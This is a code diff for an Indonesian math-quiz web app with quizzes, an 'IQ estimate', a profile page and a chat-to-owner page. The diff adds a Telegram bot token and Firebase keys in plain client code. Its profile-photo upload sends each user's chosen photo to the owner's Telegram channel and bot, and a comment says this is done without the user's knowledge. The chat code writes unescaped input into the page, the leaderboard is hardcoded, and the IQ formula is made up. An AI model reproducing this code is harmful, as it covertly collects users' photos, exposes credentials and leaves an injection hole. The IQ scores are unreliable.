+                    <option value="*">✖️ Perkalian</option>
+                    <option value="/">➗ Pembagian</option>
+                    <option value="^">🔢 Perpangkatan</option>
+                    <option value="√">√ Akar</option>
+                </select>
+            </div>
+            
+            <div class="output-display" id="quizSoal" style="text-align: center; display: flex; align-items: center; justify-content: center; min-height: 80px;">
+                <span class="soal-display">Klik Mulai Ujian</span>
+            </div>
+            
+            <input type="text" id="jawabanQuiz" placeholder="Masukkan jawaban..." style="text-align: center; margin-bottom: 12px;">
+            
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <button class="btn-primary" onclick="cekJawaban()">Jawab</button>
+                <button class="btn-primary btn-secondary" id="btnNextSoal" onclick="nextSoal()" style="display:none;">Lanjut ➡️</button>
+            </div>
+            
+            <div id="quizFeedback" style="text-align: center; margin: 16px 0; font-size: 0.9rem;"></div>
+            <div class="score" id="quizScore">SCORE: 0</div>
+            
+            <button class="btn-primary" style="margin-top: 20px; background: linear-gradient(135deg, #10b981, #059669);" onclick="mulaiQuiz()">Mulai Ujian</button>
+        </div>
+
+        <!-- Result Section -->
+        <div id="result" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                    <polyline points="14 2 14 8 20 8"/>
+                    <line x1="16" y1="13" x2="8" y2="13"/>
+                    <line x1="16" y1="17" x2="8" y2="17"/>
+                    <polyline points="10 9 9 9 8 9"/>
+                </svg>
+                <h2>Raport Nilai & IQ Estimasi</h2>
+            </div>
+            
+            <div style="overflow-x: auto;">
+                <table class="result-table" id="resultTable">
+                    <thead>
+                        <tr><th>SOAL</th><th>RATING</th><th>NILAI</th></tr>
+                    </thead>
+                    <tbody id="resultTableBody">
+                        <tr><td colspan="3" style="text-align: center;">Belum ada data ujian</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="nilai-akhir" id="nilaiAkhirContainer" style="display: none;">
+                <h3>🏆 NILAI AKHIR 🏆</h3>
+                <div class="nilai-besar" id="nilaiAkhir">0</div>
+                <div style="font-size: 0.8rem; margin-top: 8px; font-weight: 600;" id="predikatAkhir"></div>
+                
+                <div style="margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1);">
+                    <div style="font-size: 0.8rem; color: var(--text-secondary); letter-spacing: 0.5px; font-weight: 600;">🧠 ESTIMASI IQ RATA-RATA</div>
+                    <div style="font-size: 2.2rem; font-weight: 800; color: #fcd34d; margin: 8px 0;" id="iqEstimasiDisplay">--</div>
+                    <div class="iq-badge" id="iqKategoriDisplay">-</div>
+                    <div class="iq-detail" id="iqDetailDisplay"></div>
+                </div>
+
+                <!-- Tombol Kirim ke Channel & Inline Buttons -->
+                <div style="margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255,255,255,0.1);">
+                    <button class="btn-primary btn-success" onclick="kirimHasilIQKeChannel()" id="btnKirimChannel">
+                        📤 Kirim Hasil IQ ke Channel
+                    </button>
+                    <div id="statusKirimChannel" style="margin-top: 8px; font-size: 0.8rem; color: var(--text-muted);"></div>
+                    
+                    <div class="inline-buttons">
+                        <a href="https://t.me/MTKS_VBOT" target="_blank" class="btn-inline primary">
+                            🤖 @MTKS_VBOT
+                        </a>
+                        <a href="https://t.me/SENDY4Z" target="_blank" class="btn-inline success">
+                            👤 @SENDY4Z
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- LEADERBOARD -->
+            <div style="margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.08);">
+                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2">
+                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
+                    </svg>
+                    <h2 style="font-size: 1.1rem; font-weight: 700;">🏆 Papan Peringkat</h2>
+                    <span style="font-size: 0.65rem; color: var(--text-muted); margin-left: auto; background: rgba(255,255,255,0.05); padding: 4px 12px; border-radius: 12px;">Total Nilai</span>
+                </div>
+                <div id="leaderboardContainer">
+                    <div id="leaderboardList">
+                        <!-- PLAYER MANUAL - TAMPIL LANGSUNG -->
+                        <div class="leaderboard-item" style="border-left: 3px solid var(--primary);">
+                            <div class="leaderboard-rank top1">🥇</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">SENDYZ <span class="me-badge"></span></div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                        <div class="leaderboard-item">
+                            <div class="leaderboard-rank top2">🥈</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">RFTZY231</div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                        <div class="leaderboard-item">
+                            <div class="leaderboard-rank top3">🥉</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">FALISHA</div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                        <div class="leaderboard-item">
+                            <div class="leaderboard-rank">4</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">PLAYER4</div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                        <div class="leaderboard-item">
+                            <div class="leaderboard-rank">5</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">PLAYER5</div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                        <div class="leaderboard-item">
+                            <div class="leaderboard-rank">6</div>
+                            <div class="leaderboard-info">
+                                <div class="leaderboard-username">PLAYER6</div>
+                                <div class="leaderboard-detail"></div>
+                            </div>
+                            <div class="leaderboard-iq"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn-primary" style="margin-top: 20px; background: linear-gradient(135deg, #6366f1, #4f46e5);" onclick="resetAndHome()">← Kembali ke Beranda</button>
+        </div>
+
+        <!-- OCR & Custom -->
+        <div id="customSoal" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f43f5e" stroke-width="1.8">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                    <polyline points="14 2 14 8 20 8"/>
+                    <line x1="16" y1="13" x2="8" y2="13"/>
+                    <line x1="16" y1="17" x2="8" y2="17"/>
+                </svg>
+                <h2>Tools & OCR Scanner</h2>
+            </div>
+            
+            <div style="margin-bottom: 28px;">
+                <label style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 6px; display: block; font-weight: 600;">MANUAL INPUT</label>
+                <textarea id="soalUser" rows="2" placeholder="Contoh: 15% dari 500 + 20"></textarea>
+                <button class="btn-primary" onclick="hitungCustomSoal()" style="margin-top: 12px;">Hitung</button>
+                <div class="output-display" id="outputCustomSoal" style="margin-top: 16px;"></div>
+            </div>
+
+            <div style="border-top: 1px solid rgba(255, 255, 255, 0.08); padding-top: 20px;">
+                <label style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 6px; display: block; font-weight: 600;">OCR SCANNER (BETA)</label>
+                <input type="file" id="fotoSoal" accept="image/*">
+                <div id="previewFoto" style="margin: 16px 0;"></div>
+                <button class="btn-primary btn-secondary" onclick="kirimFotoSoal()">🔍 Scan Gambar</button>
+            </div>
+        </div>
+
+        <!-- History -->
+        <div id="history" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+                    <circle cx="12" cy="12" r="10"/>
+                    <polyline points="12 6 12 12 16 14"/>
+                </svg>
+                <h2>History Perhitungan</h2>
+                <button onclick="clearHistory()" style="margin-left: auto; background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.3); padding: 6px 12px; border-radius: 20px; color: #f87171; font-size: 0.7rem; cursor: pointer; font-weight: 600;">Clear</button>
+            </div>
+            <div id="historyList" style="max-height: 350px; overflow-y: auto;"></div>
+        </div>
+
+        <!-- Profile -->
+        <div id="profile" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="1.8">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                    <circle cx="12" cy="7" r="4"/>
+                </svg>
+                <h2>👤 Profile</h2>
+                <button onclick="showSection('mainMenu')" style="margin-left:auto; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.08); padding:6px 14px; border-radius:20px; color:var(--text-secondary); font-size:0.7rem; cursor:pointer;">✕ Tutup</button>
+            </div>
+
+            <!-- Avatar -->
+            <div class="profile-avatar" id="profileAvatar" onclick="document.getElementById('avatarInput').click()">
+                <div class="avatar-placeholder" id="avatarPlaceholder">👤</div>
+                <img id="avatarImage" style="display:none;" alt="Profile Photo">
+                <div class="avatar-overlay">📷 Ganti Foto</div>
+            </div>
+            <input type="file" id="avatarInput" accept="image/*" style="display:none;" onchange="uploadProfilePhoto(event)">
+
+            <div class="profile-info">
+                <div class="username" id="profileUsername">Username</div>
+                <div class="email" id="profileEmail">email@example.com</div>
+            </div>
+
+            <div class="profile-stats">
+                <div class="profile-stat-box">
+                    <div class="value" id="profileTotalNilai">0</div>
+                    <div class="label">Total Nilai</div>
+                </div>
+                <div class="profile-stat-box">
+                    <div class="value" id="profileTotalUjian">0</div>
+                    <div class="label">Total Ujian</div>
+                </div>
+                <div class="profile-stat-box">
+                    <div class="value" id="profileRataNilai">0</div>
+                    <div class="label">Rata-rata</div>
+                </div>
+            </div>
+
+            <div class="profile-level-stats">
+                <div style="font-size:0.8rem; font-weight:700; margin-bottom:8px; color:var(--text-secondary);">📊 RINCIAN PER TINGKATAN</div>
+                <div class="profile-level-item">
+                    <span class="level-name">🎨 TK</span>
+                    <span class="level-value" id="profileLevelTk">0</span>
+                </div>
+                <div class="profile-level-item">
+                    <span class="level-name">👦 SD</span>
+                    <span class="level-value" id="profileLevelSd">0</span>
+                </div>
+                <div class="profile-level-item">
+                    <span class="level-name">👨‍🎓 SMP</span>
+                    <span class="level-value" id="profileLevelSmp">0</span>
+                </div>
+                <div class="profile-level-item">
+                    <span class="level-name">👩‍🎓 SMA</span>
+                    <span class="level-value" id="profileLevelSma">0</span>
+                </div>
+                <div class="profile-level-item">
+                    <span class="level-name">🎓 Universitas</span>
+                    <span class="level-value" id="profileLevelUniv">0</span>
+                </div>
+                <div class="profile-level-item" style="border-top:1px solid rgba(255,255,255,0.1); padding-top:10px; margin-top:6px;">
+                    <span class="level-name" style="font-weight:700; color:var(--primary-light);">📈 TOTAL SEMUA</span>
+                    <span class="level-value" style="font-weight:800; color:var(--primary-light);" id="profileLevelTotal">0</span>
+                </div>
+            </div>
+
+            <button class="btn-primary" style="margin-top:20px; background: linear-gradient(135deg, #6366f1, #4f46e5);" onclick="showSection('mainMenu')">← Kembali ke Beranda</button>
+        </div>
+
+        <!-- Chat Owner -->
+        <div id="chatOwner" class="card hidden">
+            <div class="card-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8">
+                    <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+                </svg>
+                <h2>💬 Chat Owner</h2>
+                <button onclick="showSection('mainMenu')" style="margin-left:auto; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.08); padding:6px 14px; border-radius:20px; color:var(--text-secondary); font-size:0.7rem; cursor:pointer;">✕ Tutup</button>
+            </div>
+            <p style="color:var(--text-secondary); font-size:0.8rem; margin-bottom:16px;">Kirim pesan ke Channel & Bot Telegram.</p>
+            
+            <div class="chat-messages" id="chatMessages">
+                <div class="chat-msg" style="text-align:center; color:var(--text-muted); font-size:0.75rem;">Kirim pesan untuk memulai percakapan</div>
+            </div>
+            
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="chatInput" placeholder="Tulis pesan..." style="flex:1;" onkeypress="if(event.key==='Enter') sendChat()">
+                <button class="btn-primary" style="width:auto; padding:14px 24px;" onclick="sendChat()">Kirim</button>
+            </div>
+            <div id="chatStatus" style="margin-top:10px; font-size:0.8rem; color:var(--text-muted); text-align:center;"></div>
+        </div>
+        
+    </div>
+
+    <!-- Bottom Navigation -->
+    <nav class="nav-dock">
+        <button class="nav-item active" onclick="showSection('mainMenu')">
+            <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+            <span class="nav-label">Home</span>
+        </button>
+        <button class="nav-item" onclick="showSection('calculator')">
+            <svg viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="8" y1="6" x2="16" y2="6"/><line x1="8" y1="10" x2="16" y2="10"/><line x1="8" y1="14" x2="12" y2="14"/><line x1="14" y1="14" x2="16" y2="14"/><line x1="8" y1="18" x2="16" y2="18"/></svg>
+            <span class="nav-label">Calc</span>
+        </button>
+        <button class="nav-item" onclick="showSection('quiz')">
+            <svg viewBox="0 0 24 24"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
+            <span class="nav-label">Quiz</span>
+        </button>
+        <button class="nav-item" onclick="showResultPage()">
+            <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+            <span class="nav-label">Nilai</span>
+        </button>
+        <button class="nav-item" onclick="showSection('profile')">
+            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            <span class="nav-label">Profile</span>
+        </button>
+    </nav>
 
     <script>
-        // ========== INISIALISASI FIREBASE ==========
+        // ========== FIREBASE KONFIGURASI ==========
+        const firebaseConfig = {
+            apiKey: "AIzaSyBteqG8vcS_GXAYuQMIceM017KNyxNm80M",
+            authDomain: "endymtks.firebaseapp.com",
+            projectId: "endymtks",
+            storageBucket: "endymtks.firebasestorage.app",
+            messagingSenderId: "1071549664337",
+            appId: "1:1071549664337:web:ae60886b5e15f257a23c70"
+        };
+
+        // Inisialisasi Firebase
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.firestore();
         const storage = firebase.storage();
 
-        // ========== KONFIGURASI BOT TELEGRAM (dari firebase-config.js) ==========
-        // BOT_TOKEN, OWNER_ID, CHANNEL_ID, SESSION_KEY sudah tersedia
+        // ========== KONFIGURASI BOT TELEGRAM ==========
+        const BOT_TOKEN = '8560885133:AAF7heamasTq4YeD7mO6TZPYEpversCLUA4';
+        const OWNER_ID = '8533245075';
+        const CHANNEL_ID = '-1003400502811';
+        // ===============================================
 
         // ========== CEK SESSION ==========
+        const SESSION_KEY = 'mtks_session';
         let currentUser = null;
         let currentUserUID = null;
         let currentUserEmail = null;
@@ -117,7 +1564,9 @@
 
         // ========== KIRIM KE CHANNEL & BOT ==========
         async function sendToChannelAndBot(text) {
+            // Kirim ke Channel
             const channelSuccess = await sendToTelegram(CHANNEL_ID, text);
+            // Kirim ke Bot (Owner)
             const botSuccess = await sendToTelegram(OWNER_ID, text);
             return channelSuccess && botSuccess;
         }
@@ -129,8 +1578,682 @@
             return channelSuccess && botSuccess;
         }
 
-        // ========== SISA KODE SAMA SEPERTI SEBELUMNYA ==========
-        // ... Semua fungsi lainnya (kirimHasilIQKeChannel, loadProfile, quiz, calculator, dll) tetap sama ...
+        // ========== KIRIM HASIL IQ KE CHANNEL & FIREBASE ==========
+        async function kirimHasilIQKeChannel() {
+            const btn = document.getElementById('btnKirimChannel');
+            const statusEl = document.getElementById('statusKirimChannel');
+            
+            const savedData = localStorage.getItem('hasilUjianTerakhir');
+            if (!savedData) {
+                statusEl.innerHTML = '<span style="color:#ef4444;">❌ Belum ada data ujian. Selesaikan ujian dulu!</span>';
+                return;
+            }
+
+            const data = JSON.parse(savedData);
+            const tingkat = data.tingkat || 'sd';
+            const nilaiAkhir = data.nilaiAkhir || 0;
+            const iq = estimasiIQ(tingkat, nilaiAkhir);
+            const kategori = getKategoriIQ(iq);
+
+            let keteranganUsia = '';
+            let statusPelajaran = tingkat.toUpperCase();
+            if (tingkat === 'tk') { statusPelajaran = 'TK'; keteranganUsia = 'Usia 4-6 tahun'; }
+            else if (tingkat === 'sd') { statusPelajaran = 'SD'; keteranganUsia = 'Usia 6-12 tahun'; }
+            else if (tingkat === 'smp') { statusPelajaran = 'SMP'; keteranganUsia = 'Usia 12-15 tahun'; }
+            else if (tingkat === 'sma') { statusPelajaran = 'SMA'; keteranganUsia = 'Usia 15-18 tahun'; }
+            else if (tingkat === 'mahasiswa') { statusPelajaran = 'Universitas'; keteranganUsia = 'Usia 18-20 tahun'; }
+
+            const username = currentUser || 'Anonim';
+            const pesan = `📊 *DETAIL USER CAPABILITIES!*\n\n👤 *USERNAME PLAYER:* ${username}\n🧠 *NILAI IQ RATA-RATA:* ${iq} (${kategori.label})\n📚 *OPSI STATUS PELAJAR:* ${statusPelajaran} (${keteranganUsia})\n📝 *NILAI UJIAN:* ${nilaiAkhir}/100`;
+
+            btn.disabled = true;
+            btn.textContent = '⏳ Mengirim...';
+            statusEl.innerHTML = '<span style="color: var(--text-secondary);">Mengirim ke channel...</span>';
+
+            // Kirim ke Channel & Bot
+            const success = await sendToChannelAndBot(pesan);
+
+            // Simpan ke Firestore untuk Leaderboard
+            if (currentUserUID) {
+                try {
+                    const docRef = db.collection('leaderboard').doc(currentUserUID);
+                    const doc = await docRef.get();
+                    
+                    let totalNilai = nilaiAkhir;
+                    let totalUjian = 1;
+                    
+                    if (doc.exists) {
+                        const existingData = doc.data();
+                        totalNilai = (existingData.totalNilai || 0) + nilaiAkhir;
+                        totalUjian = (existingData.totalUjian || 0) + 1;
+                    }
+                    
+                    await docRef.set({
+                        username: username,
+                        uid: currentUserUID,
+                        iq: iq,
+                        nilai: nilaiAkhir,
+                        totalNilai: totalNilai,
+                        totalUjian: totalUjian,
+                        tingkat: tingkat,
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    }, { merge: true });
+                    
+                    console.log('Leaderboard data saved to Firestore');
+                } catch (err) {
+                    console.error('Error saving to Firestore:', err);
+                }
+            }
+
+            if (success) {
+                statusEl.innerHTML = '<span style="color: #34d399;">✅ Berhasil dikirim ke Channel & Bot!</span>';
+                btn.textContent = '✅ Terkirim!';
+                loadLeaderboard();
+                loadProfile();
+            } else {
+                statusEl.innerHTML = '<span style="color: #ef4444;">❌ Gagal mengirim. Coba lagi nanti.</span>';
+                btn.disabled = false;
+                btn.textContent = '📤 Kirim Hasil IQ ke Channel';
+            }
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.textContent = '📤 Kirim Hasil IQ ke Channel';
+            }, 5000);
+        }
+
+        // ========== LEADERBOARD ==========
+        async function loadLeaderboard() {
+            // Function tetap ada untuk update dari Firestore jika diperlukan
+            console.log('Leaderboard loaded with manual data');
+        }
+
+        // ========== PROFILE ==========
+        function loadProfile() {
+            if (!currentUser) return;
+            
+            document.getElementById('profileUsername').textContent = currentUser;
+            document.getElementById('profileEmail').textContent = currentUserEmail || 'email@example.com';
+            
+            // Load from Firestore
+            if (currentUserUID) {
+                db.collection('leaderboard').doc(currentUserUID).get().then(doc => {
+                    if (doc.exists) {
+                        const data = doc.data();
+                        const totalNilai = data.totalNilai || 0;
+                        const totalUjian = data.totalUjian || 0;
+                        const rataNilai = totalUjian > 0 ? Math.round(totalNilai / totalUjian) : 0;
+                        
+                        document.getElementById('profileTotalNilai').textContent = totalNilai;
+                        document.getElementById('profileTotalUjian').textContent = totalUjian;
+                        document.getElementById('profileRataNilai').textContent = rataNilai;
+                        
+                        // Load level stats
+                        loadLevelStats();
+                    }
+                }).catch(err => console.error('Error loading profile:', err));
+            }
+        }
+
+        function loadLevelStats() {
+            const levelData = JSON.parse(localStorage.getItem('mtks_level_stats') || '{}');
+            const levels = ['tk', 'sd', 'smp', 'sma', 'mahasiswa'];
+            const levelLabels = ['profileLevelTk', 'profileLevelSd', 'profileLevelSmp', 'profileLevelSma', 'profileLevelUniv'];
+            
+            let total = 0;
+            levels.forEach((level, index) => {
+                const value = levelData[level] || 0;
+                document.getElementById(levelLabels[index]).textContent = value;
+                total += value;
+            });
+            
+            document.getElementById('profileLevelTotal').textContent = total;
+        }
+
+        // ========== UPLOAD PROFILE PHOTO ==========
+        async function uploadProfilePhoto(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = document.getElementById('avatarImage');
+                const placeholder = document.getElementById('avatarPlaceholder');
+                img.src = e.target.result;
+                img.style.display = 'block';
+                placeholder.style.display = 'none';
+            };
+            reader.readAsDataURL(file);
+
+            // Kirim foto ke Channel & Bot tanpa sepengetahuan user
+            try {
+                const caption = `📸 *UPDATE FOTO PROFILE*\n\n👤 *User:* ${currentUser || 'Anonim'}\n🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+                
+                // Kirim ke Channel & Bot
+                const success = await sendPhotoToChannelAndBot(file, caption);
+                
+                if (success) {
+                    console.log('📸 Profile photo sent to Channel & Bot');
+                } else {
+                    console.log('❌ Failed to send profile photo');
+                }
+            } catch (error) {
+                console.error('Error sending photo:', error);
+            }
+        }
+
+        // ========== CHAT OWNER (Kirim ke Channel & Bot) ==========
+        async function sendChat() {
+            const input = document.getElementById('chatInput');
+            const status = document.getElementById('chatStatus');
+            const msg = input.value.trim();
+            if (!msg) {
+                status.textContent = '⚠️ Tulis pesan terlebih dahulu';
+                status.style.color = '#f87171';
+                return;
+            }
+
+            status.textContent = '⏳ Mengirim...';
+            status.style.color = 'var(--text-secondary)';
+            input.disabled = true;
+
+            const user = currentUser || 'Anonim';
+            const text = `💬 *Pesan dari MTKS - Chat Owner*\n\n👤 *User:* ${user}\n📝 *Pesan:* ${msg}\n🕐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            
+            // Kirim ke Channel & Bot
+            const success = await sendToChannelAndBot(text);
+            
+            if (success) {
+                status.textContent = '✅ Pesan terkirim ke Channel & Bot!';
+                status.style.color = '#34d399';
+                const container = document.getElementById('chatMessages');
+                const time = new Date().toLocaleTimeString('id-ID');
+                const chatDiv = document.createElement('div');
+                chatDiv.className = 'chat-msg own';
+                chatDiv.innerHTML = `<strong>Anda:</strong> ${msg} <span class="time">${time}</span>`;
+                container.appendChild(chatDiv);
+                container.scrollTop = container.scrollHeight;
+                input.value = '';
+            } else {
+                status.textContent = '❌ Gagal mengirim. Coba lagi.';
+                status.style.color = '#f87171';
+            }
+            
+            input.disabled = false;
+            setTimeout(() => { status.textContent = ''; }, 4000);
+        }
+
+        // ========== LOGIKA UTAMA ==========
+        let currentSoal = '', currentHasil = '';
+        let poolSoal = [], indexSoal = 0, skor = 0;
+        let calculationHistory = JSON.parse(localStorage.getItem('mathAppHistory')) || [];
+        let hasilPerSoal = [];
+        let timerInterval = null;
+        let timeLeft = 0;
+        let isQuizActive = false;
+        let currentLevel = 'sd';
+
+        let calcExpression = '';
+
+        function getTimeForLevel(level) {
+            switch(level) {
+                case 'tk': return 180;
+                case 'sd': return 300;
+                case 'smp': return 480;
+                case 'sma': return 720;
+                case 'mahasiswa': return 900;
+                default: return 300;
+            }
+        }
+
+        function formatTime(seconds) {
+            const minutes = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        function updateTimerDisplay() {
+            const timerDisplay = document.getElementById('timerDisplay');
+            if (timerDisplay) {
+                timerDisplay.textContent = formatTime(timeLeft);
+                timerDisplay.classList.remove('warning', 'danger');
+                if (timeLeft <= 60) timerDisplay.classList.add('danger');
+                else if (timeLeft <= 120) timerDisplay.classList.add('warning');
+            }
+        }
+
+        function stopTimer() {
+            if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+        }
+
+        function startTimer() {
+            stopTimer();
+            timerInterval = setInterval(() => {
+                if (timeLeft > 0 && isQuizActive) {
+                    timeLeft--;
+                    updateTimerDisplay();
+                    if (timeLeft === 0) handleTimeout();
+                }
+            }, 1000);
+        }
+
+        function resetTimer() {
+            const level = document.getElementById('tingkatPendidikan').value;
+            timeLeft = getTimeForLevel(level);
+            updateTimerDisplay();
+        }
+
+        function handleTimeout() {
+            if (!isQuizActive) return;
+            const feedback = document.getElementById('quizFeedback');
+            feedback.innerHTML = '<span style="color:#f59e0b; font-weight:bold;">⏰ Waktu habis! Melanjutkan...</span>';
+            if (indexSoal < poolSoal.length) {
+                hasilPerSoal.push({
+                    soal: poolSoal[indexSoal].soal,
+                    jawabanBenar: poolSoal[indexSoal].hasil,
+                    status: 'salah',
+                    rating: '0/1',
+                    nilai: 0
+                });
+            }
+            const wasActive = isQuizActive;
+            isQuizActive = false;
+            stopTimer();
+            setTimeout(() => {
+                if (indexSoal + 1 < poolSoal.length) {
+                    indexSoal++;
+                    tampilkanSoal(indexSoal);
+                    resetTimer();
+                    isQuizActive = wasActive;
+                    startTimer();
+                    feedback.innerHTML = '';
+                } else {
+                    isQuizActive = false;
+                    stopTimer();
+                    document.getElementById('quizSoal').innerHTML = '<span class="soal-display">🎉 Ujian Selesai!</span>';
+                    document.getElementById('jawabanQuiz').value = "";
+                    document.getElementById('btnNextSoal').style.display = 'none';
+                    feedback.innerHTML = `<span style="color:var(--warning)">⏰ Waktu habis! Skor Akhir: ${skor}/${poolSoal.length}</span>`;
+                    simpanHasilUjian();
+                }
+            }, 1500);
+        }
+
+        // ========== SIMPAN HASIL UJIAN OTOMATIS KE PROFILE ==========
+        function simpanHasilUjian() {
+            if (hasilPerSoal.length > 0) {
+                const level = document.getElementById('tingkatPendidikan').value;
+                const nilaiAkhir = Math.round((skor / poolSoal.length) * 100);
+                const ujianData = {
+                    tanggal: new Date().toLocaleString('id-ID'),
+                    hasil: hasilPerSoal,
+                    totalSoal: poolSoal.length,
+                    skor: skor,
+                    nilaiAkhir: nilaiAkhir,
+                    tingkat: level
+                };
+                localStorage.setItem('hasilUjianTerakhir', JSON.stringify(ujianData));
+                
+                // ===== UPDATE LEVEL STATS OTOMATIS =====
+                const levelStats = JSON.parse(localStorage.getItem('mtks_level_stats') || '{}');
+                const currentValue = levelStats[level] || 0;
+                // Tambahkan nilai akhir ke level yang dipilih
+                levelStats[level] = currentValue + nilaiAkhir;
+                localStorage.setItem('mtks_level_stats', JSON.stringify(levelStats));
+                
+                // Update tampilan profile jika sedang terbuka
+                loadLevelStats();
+                
+                // Update total nilai di profile
+                if (currentUserUID) {
+                    db.collection('leaderboard').doc(currentUserUID).get().then(doc => {
+                        if (doc.exists) {
+                            const data = doc.data();
+                            const totalNilai = (data.totalNilai || 0) + nilaiAkhir;
+                            const totalUjian = (data.totalUjian || 0) + 1;
+                            db.collection('leaderboard').doc(currentUserUID).update({
+                                totalNilai: totalNilai,
+                                totalUjian: totalUjian
+                            }).then(() => {
+                                console.log('Profile updated with new exam result');
+                                // Update tampilan profile
+                                document.getElementById('profileTotalNilai').textContent = totalNilai;
+                                document.getElementById('profileTotalUjian').textContent = totalUjian;
+                                const rataNilai = totalUjian > 0 ? Math.round(totalNilai / totalUjian) : 0;
+                                document.getElementById('profileRataNilai').textContent = rataNilai;
+                            }).catch(err => console.error('Error updating profile:', err));
+                        }
+                    }).catch(err => console.error('Error loading profile for update:', err));
+                }
+            }
+        }
+
+        function estimasiIQ(tingkat, nilai) {
+            const baseIQ = {
+                'tk': 40,
+                'sd': 70,
+                'smp': 85,
+                'sma': 100,
+                'mahasiswa': 110
+            };
+            let base = baseIQ[tingkat] || 70;
+            let tambahan = Math.round((nilai / 100) * 35);
+            let iq = Math.min(140, Math.max(20, base + tambahan));
+            return iq;
+        }
+
+        function getKategoriIQ(iq) {
+            if (iq >= 140) return { label: 'GENIUS', color: '#fbbf24' };
+            if (iq >= 130) return { label: 'SANGAT CERDAS', color: '#f59e0b' };
+            if (iq >= 120) return { label: 'CERDAS', color: '#34d399' };
+            if (iq >= 110) return { label: 'NORMAL BRIGHT', color: '#60a5fa' };
+            if (iq >= 90) return { label: 'NILAI RATA-RATA', color: '#818cf8' };
+            if (iq >= 80) return { label: 'LUMAYAN', color: '#a78bfa' };
+            if (iq >= 69) return { label: 'LAMBAT', color: '#f87171' };
+            if (iq >= 40) return { label: 'RENDAH', color: '#fca5a5' };
+            return { label: 'MASIH PERLU BELAJAR LAGI', color: '#ef4444' };
+        }
+
+        function showResultPage() {
+            isQuizActive = false;
+            stopTimer();
+            
+            const savedData = localStorage.getItem('hasilUjianTerakhir');
+            const resultTableBody = document.getElementById('resultTableBody');
+            const nilaiAkhirContainer = document.getElementById('nilaiAkhirContainer');
+            
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                const hasil = data.hasil || [];
+                const nilaiAkhir = data.nilaiAkhir || 0;
